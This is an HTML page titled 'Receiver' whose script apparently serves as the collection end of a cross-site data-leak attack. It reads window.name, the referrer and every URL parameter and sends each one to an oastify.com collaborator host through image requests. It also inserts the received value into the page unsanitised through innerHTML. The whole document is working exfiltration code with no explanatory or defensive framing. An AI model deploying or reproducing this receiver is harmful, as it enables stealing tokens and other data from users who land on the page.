<!DOCTYPE html>
<html>
<head><title>Receiver</title></head>
<body>
<h1>Data Receiver</h1>
<div id="data"></div>
<script>
const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';

// Read window.name (persists across navigations!)
const data = window.name;

document.getElementById('data').innerHTML = 'Received: ' + data;

// Exfiltrate
new Image().src = EXFIL + '/received?data=' + encodeURIComponent(data);

// Also check if we have a referrer
new Image().src = EXFIL + '/referrer?ref=' + encodeURIComponent(document.referrer);

// Try to read any URL parameters
const params = new URLSearchParams(window.location.search);
for (let [key, value] of params) {
    new Image().src = EXFIL + '/param?k=' + encodeURIComponent(key) + '&v=' + encodeURIComponent(value);
}
</script>
</body>
</html>
